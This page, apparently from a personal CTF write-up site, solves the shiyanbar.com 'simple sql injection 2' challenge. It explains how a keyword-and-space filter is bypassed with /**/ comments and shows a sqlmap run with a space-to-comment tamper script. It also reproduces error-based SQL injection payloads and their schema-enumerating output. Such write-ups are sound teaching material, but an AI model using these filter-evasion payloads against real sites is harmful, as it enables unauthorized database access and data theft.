@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  
+  <link rel="shortcut icon" href="../../../img/favicon.ico">
+  <title>[shiyanbar.com] simple sql injection 2 - 0Xor' CTF WriteUp</title>
+  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>
+
+  <link rel="stylesheet" href="../../../css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../../css/theme_extra.css" type="text/css" />
+  <link rel="stylesheet" href="../../../css/highlight.css">
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "[shiyanbar.com] simple sql injection 2";
+    var mkdocs_page_input_path = "wargame\\web\\[shiyanbar.com]_simple_sql_injection_2.md";
+    var mkdocs_page_url = "/wargame/web/[shiyanbar.com]_simple_sql_injection_2/";
+  </script>
+  
+  <script src="../../../js/jquery-2.1.1.min.js"></script>
+  <script src="../../../js/modernizr-2.8.3.min.js"></script>
+  <script type="text/javascript" src="../../../js/highlight.pack.js"></script> 
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+      <div class="wy-side-nav-search">
+        <a href="../../.." class="icon icon-home"> 0Xor' CTF WriteUp</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+	<ul class="current">
+	  
+          
+            <li class="toctree-l1">
+		
+    <a class="" href="../../..">Welcome to 0Xor' WriteUp</a>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Reversing</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="../../../reversing/Moblie/">Moblie</a>
+                </li>
+                <li class="">
+                    
+    <a class="" href="../../../reversing/reversing%20misc/">reversing misc</a>
+                </li>
+                <li class="">
+                    
+    <span class="caption-text">Encrypt&decrypt</span>
+    <ul class="subnav">
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../../reversing/encrypt%26decrypt/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%20%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">加密与解密 第一章 基础知识</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../../reversing/encrypt%26decrypt/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%20%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/">加密与解密 第三章 静态调试技术</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../../reversing/encrypt%26decrypt/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%20%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/">加密与解密 第二章 动态调试技术</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../../reversing/encrypt%26decrypt/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%20%E7%AC%AC%E5%8D%81%E7%AB%A0-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/">加密与解密 第十章 PE文件格式</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../../reversing/encrypt%26decrypt/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%20%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">加密与解密 第四章 逆向分析技术</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../../reversing/encrypt%26decrypt/%E7%9B%AE%E5%BD%95/">目录</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Wargame</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <span class="caption-text">Crypto</span>
+    <ul class="subnav">
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_PHP_decode/">[ctf.nuptzj.cn] PHP decode</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_base64_N_times/">[ctf.nuptzj.cn] base64 N times</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_base64_all/">[ctf.nuptzj.cn] base64 all</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_easy/">easy</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_keyboard/">[ctf.nuptzj.cn] keyboard</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_md5/">[ctf.nuptzj.cn] md5</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_mixed_base64/">[ctf.nuptzj.cn] mixed base64</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_vigenere/">[ctf.nuptzj.cn] vigenere</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/%5Bctf.nuptzj.cn%5D_xor/">[ctf.nuptzj.cn] xor</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../crypto/crypto_summary/">Cryto Summary</a>
+                </li>
+    </ul>
+                </li>
+                <li class="">
+                    
+    <span class="caption-text">Misc</span>
+    <ul class="subnav">
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../misc/%5Bctf.nuptzj.cn%5D_gif/">[ctf.nuptzj.cn] gif</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../misc/%5Bctf.nuptzj.cn%5D_qiubilong/">丘比龙de女神</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../misc/%5Bctf.nuptzj.cn%5D_tuzhong/">图种</a>
+                </li>
+    </ul>
+                </li>
+                <li class="">
+                    
+    <span class="caption-text">Reversing</span>
+    <ul class="subnav">
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bbugku.com%5D_ali/">[bugku.com] ali</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bctf.nuptzj.cn%5D_ReadAsm2/">[ctf.nuptzj.cn] ReadAsm2</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bctf.nuptzj.cn%5D_maze/">[ctf.nuptzj.cn] maze</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bctf.nuptzj.cn%5D_py/">[ctf.nuptzj.cn] py</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bctf.nuptzj.cn%5D_wxyvm/">[ctf.nuptzj.cn] wxyvm</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bctf.nuptzj.cn%5D_wxyvm2/">[ctf.nuptzj.cn] wxyvm2</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bwhaleedu.com%5D_dice/">whale-大筛子</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../../reversing/%5Bwhaleedu.com%5D_pyc1/">py逆向1</a>
+                </li>
+    </ul>
+                </li>
+                <li class=" current">
+                    
+    <span class="caption-text">Web</span>
+    <ul class="subnav">
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bbugku.com%5D_upload_test/">上传测试</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bbugku.com%5D_web2/">web2</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_20_years/">单身20年</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_aaencode/">aaencode</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_bypass_again/">bypass again</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_cookie/">cookie</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_md5_collision/">md5 collision</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_multi-byte_character/">宽字节注入</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_mysql/">[ctf.nuptzj.cn] mysql</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_pass%20check/">[ctf.nuptzj.cn] pass check</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_php_0x/">起名字真难</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_php_LFI/">[ctf.nuptzj.cn] php LFI</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_php_decode/">[ctf.nuptzj.cn] php decode</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_qiandao/">签到</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_qiandao2/">签到2</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_sql_injection_1/">[ctf.nuptzj.cn] sql injection 1</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_sql_injection_2/">SQL INJECTION 2</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_sql_injection_4/">sql injection 4</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_upload_file/">上传绕过</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_url_redirect/">URL跳转</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_var_override/">变量覆盖</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_web3/">层层递进</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_where_are_you_come_from/">你从哪里来</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_x00/">宽字节注入</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_zonghe/">综合</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bctf.nuptzj.cn%5D_zonghe2/">综合2</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_add_something/">加了料的报错注入</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_be_serious/">认真一点吧</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_forms/">Forms（待wp）</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_guaiwanmojiao/">拐弯抹角</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_houtaidenglu/">后台登录</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_post_fast/">天下武功唯快不破</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_simple_sql_injection/">简单sql注入</a>
+                </li>
+                <li class="toctree-l3 current">
+                    
+    <a class="current" href="./">[shiyanbar.com] simple sql injection 2</a>
+    <ul class="subnav">
+            
+    <li class="toctree-l4"><a href="#_1">题目</a></li>
+    
+
+    <li class="toctree-l4"><a href="#_2">流程图</a></li>
+    
+
+    <li class="toctree-l4"><a href="#_3">解题步骤</a></li>
+    
+        <ul>
+        
+            <li><a class="toctree-l5" href="#_4">参考文章</a></li>
+        
+            <li><a class="toctree-l5" href="#_5">步骤</a></li>
+        
+        </ul>
+    
+
+    <li class="toctree-l4"><a href="#_6">解答思路</a></li>
+    
+
+    <li class="toctree-l4"><a href="#_7">漏洞挖掘思路</a></li>
+    
+
+    <li class="toctree-l4"><a href="#_8">自动化解析</a></li>
+    
+
+    </ul>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../%5Bshiyanbar.com%5D_simple_sql_injection_3/">[shiyanbar.com] simple sql injection 3</a>
+                </li>
+                <li class="toctree-l3">
+                    
+    <a class="" href="../web_summary/">Web summary</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+	    </li>
+          
+            <li class="toctree-l1">
+		
+    <span class="caption-text">Web</span>
+    <ul class="subnav">
+                <li class="">
+                    
+    <a class="" href="../../../web/sqlmap_learning/">Sqlmap learning</a>
+                </li>
+    </ul>
+	    </li>
+          
+        </ul>
+      </div>
+      &nbsp;
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="../../..">0Xor' CTF WriteUp</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../..">Docs</a> &raquo;</li>
+    
+      
+        
+          <li>Wargame &raquo;</li>
+        
+      
+        
+          <li>Web &raquo;</li>
+        
+      
+    
+    <li>[shiyanbar.com] simple sql injection 2</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <p>简单sql注入2</p>
+<h2 id="_1">题目</h2>
+<blockquote>
+<p>http://ctf5.shiyanbar.com/web/index_2.php</p>
+<p>flag</p>
+<p>到底过滤了什么东西？</p>
+</blockquote>
+<h2 id="_2">流程图</h2>
+<h2 id="_3">解题步骤</h2>
+<h4 id="_4">参考文章</h4>
+<h5 id="0x1">0x1 直接猜测表名和字段名</h5>
+<blockquote>
+<p>首先输入1，发现有将数据库的查询结果显示出来</p>
+<p>输入单引号，发现错误，这时候可以猜测后台查询语句:select name from table where id='xxx';</p>
+<p>输入'='，查询语句变成这样:select name from table where id=''='';     根据从左到右的比较可以得到where字句后面的值为1，而查询也爆出来3个结果</p>
+<p>接下来继续测试，输入'='select，或者'='or,或者'='union等都没有报错，都有三条结果显示出来</p>
+<p>而若是输入' or 1 #或者是' union或者是' or select #都显示侦测到SQL注入了，可以猜想后台应该是应该是这样处理的</p>
+<p>（代码大概是这样的，对不对我也不知道）</p>
+<p>```php
+str=_SERVER['QUERY_STRING'];</p>
+<p>str=urldecode(str);</p>
+<p>query_list=explode(' ',str);</p>
+<p>//这个过滤数组应该还有挺多，我就不写了</p>
+<p>$filter_array={'or','#','union','select','where','and'};</p>
+<p>for_each (query_list as value) {</p>
+<pre><code>if (in_array(value,filter_array)) {
+
+    echo "SQLI:detected";
+
+    exit(0);
+
+}
+</code></pre>
+<p>}
+```</p>
+<p>也就是说，空格和敏感字符的组合是会被查出来的，而在SQL注入中，可以拿来当做间隔用的还有/**/</p>
+<p>于是可以构造以下语句</p>
+<p>'/<strong>/union/</strong>/select/<strong>/flag/</strong>/from/**/flag#</p>
+<p>结果可以得到</p>
+<p><code>ID: '/**/union/**/select/**/flag/**/from/**/flag#
+name: flag{Yxxxxxxxxxxxxxd}</code></p>
+<p><code>最后，问题来了,怎么知道后台表是flag,字段名是flag？</code></p>
+<p><code>至于会问这个问题的同学，我猜大概是前面的题没做，做第一道题的时候看别人的解析我也是一脸蒙蔽</code></p>
+<p><code>也是有这个问题。当然这个表名和字段名可以通过盲注给爆出来，有兴趣的话可以写一个python脚本去</code></p>
+<p><code>爆破，具体代码我就不贴了
+最后，新人第一次发帖，打脸请轻打.....</code></p>
+</blockquote>
+<h5 id="0x2">0x2 正常流程读取</h5>
+<blockquote>
+<p>http://www.shiyanbar.com/ctf/writeup/4750</p>
+</blockquote>
+<h4 id="_5">步骤</h4>
+<h5 id="0x1_1">0x1 直接猜测法</h5>
+<ol>
+<li>
+<p>在文本框输入1，提交，链接变成id=1</p>
+</li>
+<li>
+<p>在文件框输入1'，提交，报错，判断存在注入</p>
+</li>
+<li>
+<p>在文本框输入<code>test</code>，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入</p>
+</li>
+<li>
+<p>在简单sql注入1中使用的payload为</p>
+</li>
+</ol>
+<p><code>mysql
+   1 '+unionunion +selectselect +flag+fromfrom +flag+wherewhere+'t'='t</code></p>
+<p>在这题中空格已经被过滤了，所以需要将空格替换成/**/，并不使用双重注入</p>
+<p><code>mysql
+   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t</code></p>
+<p>由此得到答案</p>
+<h5 id="0x2_1">0x2 标准注入</h5>
+<ol>
+<li>当采用标准注入时，发现database()被检测出了sql注入</li>
+</ol>
+<pre><code class="mysql">1' union/**/select/**/database()'
+</code></pre>
+
+<p>没有想到怎么才能避过检测，于是想到用sqlmap跑一跑</p>
+<p>补: 找到了可以绕过<code>()</code>的新方法：</p>
+<pre><code class="mysql">1'union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/'1'='1
+</code></pre>
+
+<ol>
+<li>使用sqlmap</li>
+</ol>
+<p><code>shell
+   sqlmap.py -u "http://ctf5.shiyanbar.com/web/index_2.php?id=1" --dbs --tamper "space2comment.py" --level 2 -v 3</code></p>
+<p>参数说明：</p>
+<ul>
+<li>--dbs 查找所有数据库</li>
+<li>"space2comment.py" 将空格转换成为/**/</li>
+<li>
+<p>-v 3 显示payload</p>
+</li>
+<li>
+<p>获取数据库数量的payload</p>
+</li>
+</ul>
+<p><code>mysql
+   1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH</code></p>
+<p>返回值：</p>
+<p><code>Duplicate entry 'qbtfq3qzqpq1' for key 'group_key'</code></p>
+<p>注意其中的值<code>3</code></p>
+<ol>
+<li>依次返回三个表的payload</li>
+</ol>
+<p><code>mysql
+   1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA
+   [16:35:47] [INFO] retrieved: information_schema</code></p>
+<p>返回结果：</p>
+<p>### <code>Duplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'</code></p>
+<p><code>mysql
+   [16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH
+   [16:35:48] [INFO] retrieved: test</code></p>
+<p><code>mysql
+   [16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK
+   [16:35:49] [INFO] retrieved: web1</code></p>
+<p>以后来研究一下，sqlmap是如何在避过<code>database()</code>检测的情况下，实现查询数据库名的</p>
+<h2 id="_6">解答思路</h2>
+<ol>
+<li>判断是否存在注入点</li>
+<li>判断注入类型</li>
+<li>判断后台的过滤机制</li>
+<li>关键字被过滤<ul>
+<li>重复关键词（例如selectselect），不成功</li>
+</ul>
+</li>
+<li>空格被过滤<ul>
+<li>使用双重空格（使用+号替代也需要重复两次），不成功</li>
+</ul>
+</li>
+<li>使用/**/替换空格，测试成功</li>
+<li>在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式</li>
+<li>需要研究sqlmap的注入流程</li>
+</ol>
+<h2 id="_7">漏洞挖掘思路</h2>
+<ul>
+<li>无</li>
+</ul>
+<h2 id="_8">自动化解析</h2>
+<ul>
+<li>
+<p>TODO</p>
+</li>
+<li>
+<p>判断题目特征：<code>web</code> <code>php</code> <code>md5</code> </p>
+</li>
+<li>设定题目难度等级<code>level</code>为simple</li>
+<li>提交相应符合要求的字符串</li>
+</ul>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../%5Bshiyanbar.com%5D_simple_sql_injection_3/" class="btn btn-neutral float-right" title="[shiyanbar.com] simple sql injection 3">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="../%5Bshiyanbar.com%5D_simple_sql_injection/" class="btn btn-neutral" title="简单sql注入"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+      <p>0Xor</p>
+    
+  </div>
+
+  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+      
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" style="cursor: pointer">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="../%5Bshiyanbar.com%5D_simple_sql_injection/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="../%5Bshiyanbar.com%5D_simple_sql_injection_3/" style="color: #fcfcfc">Next &raquo;</a></span>
+      
+    </span>
+</div>
+    <script>var base_url = '../../..';</script>
+    <script src="../../../js/theme.js"></script>
+      <script src="../../../search/require.js"></script>
+      <script src="../../../search/search.js"></script>
+
+</body>
+</html>
